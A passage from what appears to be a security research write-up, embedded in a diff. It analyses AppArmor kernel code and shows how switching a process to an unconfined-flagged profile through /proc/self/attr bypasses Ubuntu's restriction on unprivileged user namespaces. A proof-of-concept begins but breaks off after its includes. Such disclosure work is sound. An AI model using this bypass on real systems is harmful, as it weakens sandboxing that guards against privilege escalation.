+<p>The function <code class="language-plaintext highlighter-rouge">apparmor_userns_create()</code> is triggered as an AppArmor hook and is executed when a namespace is created [1]. This function then calls <code class="language-plaintext highlighter-rouge">aa_profile_ns_perm()</code> to handle namespace permission-related settings  [2].</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="k">struct</span> <span class="n">security_hook_list</span> <span class="n">apparmor_hooks</span><span class="p">[]</span> <span class="n">__ro_after_init</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="c1">// [...]</span>
+    <span class="n">LSM_HOOK_INIT</span><span class="p">(</span><span class="n">userns_create</span><span class="p">,</span> <span class="n">apparmor_userns_create</span><span class="p">),</span> <span class="c1">// [1]</span>
+    <span class="c1">// [...]</span>
+<span class="p">};</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">apparmor_userns_create</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">new_cred</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">aa_label</span> <span class="o">*</span><span class="n">label</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">aa_profile</span> <span class="o">*</span><span class="n">profile</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">error</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">label</span> <span class="o">=</span> <span class="n">begin_current_label_crit_section</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">aa_unprivileged_userns_restricted</span> <span class="cm">/* default value: 1 */</span> <span class="o">||</span>
+        <span class="n">label_mediates</span><span class="p">(</span><span class="n">label</span><span class="p">,</span> <span class="n">AA_CLASS_NS</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// [...]</span>
+
+        <span class="n">new</span> <span class="o">=</span> <span class="n">fn_label_build</span><span class="p">(</span><span class="n">label</span><span class="p">,</span> <span class="n">profile</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">,</span>
+                <span class="n">aa_profile_ns_perm</span><span class="p">(</span><span class="n">profile</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ad</span><span class="p">,</span> <span class="c1">// [2]</span>
+                           <span class="n">AA_USERNS_CREATE</span><span class="p">));</span>
+        <span class="c1">// [...]</span>
+    <span class="p">}</span>
+    <span class="n">end_current_label_crit_section</span><span class="p">(</span><span class="n">label</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">error</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>When <code class="language-plaintext highlighter-rouge">aa_profile_ns_perm()</code> detects that the profile is <strong>in unconfined status</strong> [3] and that the currently used profile matches the <strong><code class="language-plaintext highlighter-rouge">unconfined</code> profile</strong> [4], it directly applies a hardcoded <code class="language-plaintext highlighter-rouge">unprivileged_userns</code> profile [5], which corresponds to <code class="language-plaintext highlighter-rouge">/etc/apparmor.d/unprivileged_userns</code>. This is the AppArmor profile that prevents us from creating unprivileged namespaces.</p>
+
+<p>The following code only includes a portion of the <code class="language-plaintext highlighter-rouge">aa_profile_ns_perm()</code> function. The full code contains numerous comments with <strong>“TODO”</strong> and <strong>“hardcode”</strong>, indicating that the entire mechanism is still under development.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">aa_label</span> <span class="o">*</span><span class="nf">aa_profile_ns_perm</span><span class="p">(</span><span class="k">struct</span> <span class="n">aa_profile</span> <span class="o">*</span><span class="n">profile</span><span class="p">,</span>
+                    <span class="k">struct</span> <span class="n">apparmor_audit_data</span> <span class="o">*</span><span class="n">ad</span><span class="p">,</span>
+                    <span class="n">u32</span> <span class="n">request</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">aa_ruleset</span> <span class="o">*</span><span class="n">rules</span> <span class="o">=</span> <span class="n">list_first_entry</span><span class="p">(</span><span class="o">&amp;</span><span class="n">profile</span><span class="o">-&gt;</span><span class="n">rules</span><span class="p">,</span>
+                            <span class="n">typeof</span><span class="p">(</span><span class="o">*</span><span class="n">rules</span><span class="p">),</span> <span class="n">list</span><span class="p">);</span>
+    <span class="k">struct</span> <span class="n">aa_label</span> <span class="o">*</span><span class="n">new</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">aa_perms</span> <span class="n">perms</span> <span class="o">=</span> <span class="p">{</span> <span class="p">};</span>
+    <span class="n">aa_state_t</span> <span class="n">state</span><span class="p">;</span>
+
+    <span class="c1">// [...]</span>
+    <span class="n">state</span> <span class="o">=</span> <span class="n">RULE_MEDIATES</span><span class="p">(</span><span class="n">rules</span><span class="p">,</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">class</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">state</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">profile_unconfined</span><span class="p">(</span><span class="n">profile</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="c1">// [3]</span>
+            <span class="n">profile</span> <span class="o">==</span> <span class="n">profiles_ns</span><span class="p">(</span><span class="n">profile</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">unconfined</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [4]</span>
+            <span class="c1">// [...]</span>
+            <span class="n">new</span> <span class="o">=</span> <span class="n">aa_label_parse</span><span class="p">(</span><span class="o">&amp;</span><span class="n">profile</span><span class="o">-&gt;</span><span class="n">label</span><span class="p">,</span> <span class="c1">// [5]</span>
+                         <span class="s">"unprivileged_userns"</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">,</span>
+                         <span class="nb">true</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
+            <span class="c1">// [...]</span>
+            <span class="n">ad</span><span class="o">-&gt;</span><span class="n">info</span> <span class="o">=</span> <span class="s">"Userns create - transitioning profile"</span><span class="p">;</span>
+            <span class="n">perms</span><span class="p">.</span><span class="n">audit</span> <span class="o">=</span> <span class="n">request</span><span class="p">;</span>
+            <span class="n">perms</span><span class="p">.</span><span class="n">allow</span> <span class="o">=</span> <span class="n">request</span><span class="p">;</span>
+            <span class="k">goto</span> <span class="n">hard_coded</span><span class="p">;</span>
+        <span class="p">}</span> <span class="cm">/* [...] */</span>
+    <span class="p">}</span>
+
+    <span class="c1">// [...]</span>
+<span class="nl">hard_coded:</span>
+    <span class="n">aa_apply_modes_to_perms</span><span class="p">(</span><span class="n">profile</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">perms</span><span class="p">);</span>
+    <span class="c1">// [...]</span>
+    <span class="k">return</span> <span class="n">new</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>How can we determine which profile the current process is using? Intuitively, it should be recorded somewhere under <code class="language-plaintext highlighter-rouge">/proc/self/</code>. By analyzing the source code and using tools like <code class="language-plaintext highlighter-rouge">grep</code> and <code class="language-plaintext highlighter-rouge">find</code> to search for relevant keywords in both file contents and filenames, we eventually locate <code class="language-plaintext highlighter-rouge">/proc/self/attr</code>.</p>
+
+<p>This directory stores process-related attribute definitions, and within it, there’s a subdirectory named <code class="language-plaintext highlighter-rouge">apparmor</code>, which contains AppArmor-specific information.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa@aaa:~/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /proc/self/attr
+total 0
+dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 <span class="nb">.</span>
+dr-xr-xr-x 9 aaa aaa 0 Feb 17 12:16 ..
+dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 apparmor
+<span class="nt">-rw-rw-rw-</span> 1 aaa aaa 0 Feb 17 12:16 current
+<span class="nt">-rw-rw-rw-</span> 1 aaa aaa 0 Feb 17 12:16 <span class="nb">exec</span>
+<span class="nt">-rw-rw-rw-</span> 1 aaa aaa 0 Feb 17 12:16 fscreate
+<span class="nt">-rw-rw-rw-</span> 1 aaa aaa 0 Feb 17 12:16 keycreate
+<span class="nt">-r--r--r--</span> 1 aaa aaa 0 Feb 17 12:16 prev
+dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 smack
+<span class="nt">-rw-rw-rw-</span> 1 aaa aaa 0 Feb 17 12:16 sockcreate
+</code></pre></div></div>
+
+<p>The file <code class="language-plaintext highlighter-rouge">current</code> within <code class="language-plaintext highlighter-rouge">/proc/self/attr/apparmor</code> shows the profile currently in use. While it has write permissions, it appears to require a <strong>specific format</strong> for modifications to take effect.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa@aaa:~/<span class="nv">$ </span><span class="nb">cat</span> /proc/self/attr/current
+unconfined
+
+aaa@aaa:~/<span class="nv">$ </span><span class="nb">echo </span>AAA <span class="o">&gt;</span> /proc/self/attr/current
+<span class="nt">-bash</span>: <span class="nb">echo</span>: write error: Invalid argument
+</code></pre></div></div>
+
+<p>By mapping these pseudo-file names back to the source code, we can determine the read/write handlers from the file operations.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define ATTR(LSMID, NAME, MODE)             \
+    NOD(NAME, (S_IFREG|(MODE)),             \
+        NULL, &amp;proc_pid_attr_operations,    \
+        { .lsmid = LSMID })
+</span>
+<span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">pid_entry</span> <span class="n">smack_attr_dir_stuff</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_SMACK</span><span class="p">,</span> <span class="s">"current"</span><span class="p">,</span> <span class="mo">0666</span><span class="p">),</span>
+<span class="p">};</span>
+<span class="n">LSM_DIR_OPS</span><span class="p">(</span><span class="n">smack</span><span class="p">);</span>
+
+<span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">pid_entry</span> <span class="n">apparmor_attr_dir_stuff</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_APPARMOR</span><span class="p">,</span> <span class="s">"current"</span><span class="p">,</span>  <span class="mo">0666</span><span class="p">),</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_APPARMOR</span><span class="p">,</span> <span class="s">"prev"</span><span class="p">,</span>     <span class="mo">0444</span><span class="p">),</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_APPARMOR</span><span class="p">,</span> <span class="s">"exec"</span><span class="p">,</span>     <span class="mo">0666</span><span class="p">),</span>
+<span class="p">};</span>
+<span class="n">LSM_DIR_OPS</span><span class="p">(</span><span class="n">apparmor</span><span class="p">);</span>
+
+<span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">pid_entry</span> <span class="n">attr_dir_stuff</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_UNDEF</span><span class="p">,</span> <span class="s">"current"</span><span class="p">,</span>     <span class="mo">0666</span><span class="p">),</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_UNDEF</span><span class="p">,</span> <span class="s">"prev"</span><span class="p">,</span>        <span class="mo">0444</span><span class="p">),</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_UNDEF</span><span class="p">,</span> <span class="s">"exec"</span><span class="p">,</span>        <span class="mo">0666</span><span class="p">),</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_UNDEF</span><span class="p">,</span> <span class="s">"fscreate"</span><span class="p">,</span>    <span class="mo">0666</span><span class="p">),</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_UNDEF</span><span class="p">,</span> <span class="s">"keycreate"</span><span class="p">,</span>   <span class="mo">0666</span><span class="p">),</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_UNDEF</span><span class="p">,</span> <span class="s">"sockcreate"</span><span class="p">,</span>  <span class="mo">0666</span><span class="p">),</span>
+    <span class="kt">DIR</span><span class="p">(</span><span class="s">"smack"</span><span class="p">,</span>  <span class="mo">0555</span><span class="p">,</span>
+        <span class="n">proc_smack_attr_dir_inode_ops</span><span class="p">,</span> <span class="n">proc_smack_attr_dir_ops</span><span class="p">),</span>
+    <span class="kt">DIR</span><span class="p">(</span><span class="s">"apparmor"</span><span class="p">,</span>  <span class="mo">0555</span><span class="p">,</span>
+        <span class="n">proc_apparmor_attr_dir_inode_ops</span><span class="p">,</span> <span class="n">proc_apparmor_attr_dir_ops</span><span class="p">),</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>The file ops <code class="language-plaintext highlighter-rouge">proc_pid_attr_operations</code> defines the function <code class="language-plaintext highlighter-rouge">proc_pid_attr_write()</code> [6] as the write handler. At a lower level, this function calls AppArmor’s setprocattr hook, which corresponds to the function <code class="language-plaintext highlighter-rouge">apparmor_setprocattr()</code> [7].</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">proc_pid_attr_operations</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="c1">// [...]</span>
+    <span class="p">.</span><span class="n">write</span>        <span class="o">=</span> <span class="n">proc_pid_attr_write</span><span class="p">,</span> <span class="c1">// [6]</span>
+    <span class="c1">// [...]</span>
+<span class="p">};</span>
+
+<span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">proc_pid_attr_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span> <span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span> <span class="n">buf</span><span class="p">,</span>
+                   <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// [...]</span>
+    <span class="n">rv</span> <span class="o">=</span> <span class="n">security_setprocattr</span><span class="p">(</span><span class="n">PROC_I</span><span class="p">(</span><span class="n">inode</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">op</span><span class="p">.</span><span class="n">lsmid</span><span class="p">,</span> <span class="c1">// &lt;------------</span>
+                  <span class="n">file</span><span class="o">-&gt;</span><span class="n">f_path</span><span class="p">.</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span>
+                  <span class="n">count</span><span class="p">);</span>
+    <span class="c1">// [...]</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">security_setprocattr</span><span class="p">(</span><span class="kt">int</span> <span class="n">lsmid</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">security_hook_list</span> <span class="o">*</span><span class="n">hp</span><span class="p">;</span>
+
+    <span class="n">hlist_for_each_entry</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">security_hook_heads</span><span class="p">.</span><span class="n">setprocattr</span><span class="p">,</span> <span class="n">list</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lsmid</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">lsmid</span> <span class="o">!=</span> <span class="n">hp</span><span class="o">-&gt;</span><span class="n">lsmid</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">)</span>
+            <span class="k">continue</span><span class="p">;</span>
+        <span class="k">return</span> <span class="n">hp</span><span class="o">-&gt;</span><span class="n">hook</span><span class="p">.</span><span class="n">setprocattr</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span> <span class="c1">// &lt;------------</span>
+    <span class="p">}</span>
+    <span class="c1">// [...]</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="k">struct</span> <span class="n">security_hook_list</span> <span class="n">apparmor_hooks</span><span class="p">[]</span> <span class="n">__ro_after_init</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="c1">// [...]</span>
+    <span class="n">LSM_HOOK_INIT</span><span class="p">(</span><span class="n">setprocattr</span><span class="p">,</span> <span class="n">apparmor_setprocattr</span><span class="p">),</span> <span class="c1">// [7]</span>
+    <span class="c1">// [...]</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>The function <code class="language-plaintext highlighter-rouge">apparmor_setprocattr()</code> first converts the target filename into an enum value [8], then calls <code class="language-plaintext highlighter-rouge">do_setattr()</code> to handle the operation [9].</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">apparmor_setprocattr</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">,</span>
+                <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">attr</span> <span class="o">=</span> <span class="n">lsm_name_to_attr</span><span class="p">(</span><span class="n">name</span><span class="p">);</span> <span class="c1">// [8]</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">attr</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">do_setattr</span><span class="p">(</span><span class="n">attr</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span> <span class="c1">// [9]</span>
+    <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">u64</span> <span class="nf">lsm_name_to_attr</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">"current"</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">LSM_ATTR_CURRENT</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">"exec"</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">LSM_ATTR_EXEC</span><span class="p">;</span>
+    <span class="c1">// [...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The function <code class="language-plaintext highlighter-rouge">do_setattr()</code> begins by parsing the input, where the written data is interpreted in the format <code class="language-plaintext highlighter-rouge">"&lt;command&gt; &lt;profile&gt;"</code>. It then calls <code class="language-plaintext highlighter-rouge">aa_change_profile()</code> with different parameters based on the <strong>target file</strong> and the <strong>command</strong> value.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">do_setattr</span><span class="p">(</span><span class="n">u64</span> <span class="n">attr</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// [...]</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">attr</span> <span class="o">==</span> <span class="n">LSM_ATTR_CURRENT</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// [...]</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="s">"changeprofile"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">error</span> <span class="o">=</span> <span class="n">aa_change_profile</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">AA_CHANGE_NOFLAGS</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="s">"permprofile"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">error</span> <span class="o">=</span> <span class="n">aa_change_profile</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">AA_CHANGE_TEST</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="s">"stack"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">error</span> <span class="o">=</span> <span class="n">aa_change_profile</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">AA_CHANGE_STACK</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span>
+            <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">attr</span> <span class="o">==</span> <span class="n">LSM_ATTR_EXEC</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="s">"exec"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="n">error</span> <span class="o">=</span> <span class="n">aa_change_profile</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">AA_CHANGE_ONEXEC</span><span class="p">);</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="s">"stack"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="n">error</span> <span class="o">=</span> <span class="n">aa_change_profile</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="p">(</span><span class="n">AA_CHANGE_ONEXEC</span> <span class="o">|</span>
+                             <span class="n">AA_CHANGE_STACK</span><span class="p">));</span>
+        <span class="k">else</span>
+            <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">// [...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The function <code class="language-plaintext highlighter-rouge">aa_change_profile()</code> determines how a profile is applied based on different flags. First, it retrieves the profile object corresponding to the user-provided profile name [10]. Then, it performs different profile updates based on the flags.</p>
+
+<p>If the flag <code class="language-plaintext highlighter-rouge">AA_CHANGE_STACK</code> is included, AppArmor applies another profile on top of the existing one. The flag <code class="language-plaintext highlighter-rouge">AA_CHANGE_TEST</code> is used for testing, meaning the profile will not actually be applied.</p>
+
+<p>If neither the <code class="language-plaintext highlighter-rouge">AA_CHANGE_STACK</code> nor <code class="language-plaintext highlighter-rouge">AA_CHANGE_TEST</code> flags are set, <code class="language-plaintext highlighter-rouge">aa_change_profile()</code> creates an AppArmor label object using the retrieved profile [11], and then applies the new label to the current process via either <code class="language-plaintext highlighter-rouge">aa_replace_current_label()</code> [12] or <code class="language-plaintext highlighter-rouge">aa_set_current_onexec()</code> [13].</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">aa_change_profile</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fqname</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">aa_label</span> <span class="o">*</span><span class="n">label</span><span class="p">,</span> <span class="o">*</span><span class="n">new</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    
+    <span class="c1">// [...]</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">aa_label_parse</span><span class="p">(</span><span class="n">label</span><span class="p">,</span> <span class="n">fqname</span> <span class="cm">/* profile name */</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">,</span> <span class="nb">true</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span> <span class="c1">// [10]</span>
+
+    <span class="c1">// [...]</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">stack</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">new</span> <span class="o">=</span> <span class="n">fn_label_build_in_ns</span><span class="p">(</span><span class="n">label</span><span class="p">,</span> <span class="n">profile</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">,</span> <span class="c1">// [11]</span>
+                       <span class="n">aa_get_label</span><span class="p">(</span><span class="n">target</span><span class="p">),</span>
+                       <span class="n">aa_get_label</span><span class="p">(</span><span class="o">&amp;</span><span class="n">profile</span><span class="o">-&gt;</span><span class="n">label</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="c1">// [...]</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">AA_CHANGE_ONEXEC</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">error</span> <span class="o">=</span> <span class="n">aa_replace_current_label</span><span class="p">(</span><span class="n">new</span><span class="p">);</span> <span class="c1">// [12]</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">new</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">aa_put_label</span><span class="p">(</span><span class="n">new</span><span class="p">);</span>
+            <span class="n">new</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">aa_set_current_onexec</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">stack</span><span class="p">);</span> <span class="c1">// [13]</span>
+    <span class="p">}</span>
+
+    <span class="c1">// [...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>In a nut shell, if the target file being written to is <code class="language-plaintext highlighter-rouge">/proc/self/attr/exec</code> and the data is <code class="language-plaintext highlighter-rouge">"exec &lt;profile&gt;"</code>, the new profile is applied only after the <strong>process executes <code class="language-plaintext highlighter-rouge">SYS_execve</code> system call</strong>.</p>
+
+<p>Conversely, if writing to <code class="language-plaintext highlighter-rouge">/proc/self/attr/current</code> with <code class="language-plaintext highlighter-rouge">"changeprofile &lt;profile&gt;"</code>, the process’s profile is <strong>updated immediately</strong>.</p>
+
+<h2 id="4-out-of-the-sandbox">4. Out of the Sandbox</h2>
+
+<p>Let’s look back at the checks in <code class="language-plaintext highlighter-rouge">aa_profile_ns_perm()</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">aa_label</span> <span class="o">*</span><span class="nf">aa_profile_ns_perm</span><span class="p">(</span><span class="k">struct</span> <span class="n">aa_profile</span> <span class="o">*</span><span class="n">profile</span> <span class="cm">/* ... */</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">profile_unconfined</span><span class="p">(</span><span class="n">profile</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="c1">// [1]</span>
+        <span class="n">profile</span> <span class="o">==</span> <span class="n">profiles_ns</span><span class="p">(</span><span class="n">profile</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">unconfined</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [2]</span>
+        <span class="c1">// [...]</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The first check examines whether the profile is in unconfined status [1], which can also be bypassed by applying a profile in <strong>complain mode</strong>.</p>
+
+<p>The second check verifies whether the current profile is the <code class="language-plaintext highlighter-rouge">unconfined</code> profile [2]. Therefore, using a <strong>non-default profile</strong> can bypass this check.</p>
+
+<p>In short, under the current mechanism, simply <strong>applying any profile in unconfined status</strong> allows bypassing the check to create an unprivileged user namespace!</p>
+
+<h2 id="5-proof-of-concept">5. Proof-Of-Concept</h2>
+
+<p>To bypass the restriction, you just need to switch the process’s profile from the default one to another that is in unconfined status. We chose the <code class="language-plaintext highlighter-rouge">opam</code> profile simply because it is one of the simplest profiles. Its content is as follows:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># This profile allows everything and only exists to give the
+# application a name instead of having the label "unconfined"
+
+abi &lt;abi/4.0&gt;,
+include &lt;tunables/global&gt;
+
+profile opam /usr/bin/opam flags=(unconfined) {
+  userns,
+
+  # Site-specific additions and overrides. See local/README for details.
+  include if exists &lt;local/opam&gt;
+}
+</code></pre></div></div>
+
+<p>The following example code uses two methods to create an unprivileged user namespace on Ubuntu 24.10. The tested version is Ubuntu 24.10 (6.11.0-14-generic), and the test date is February 17, 2025.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _GNU_SOURCE
+#include</span> <span class="cpf">&lt;sched.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
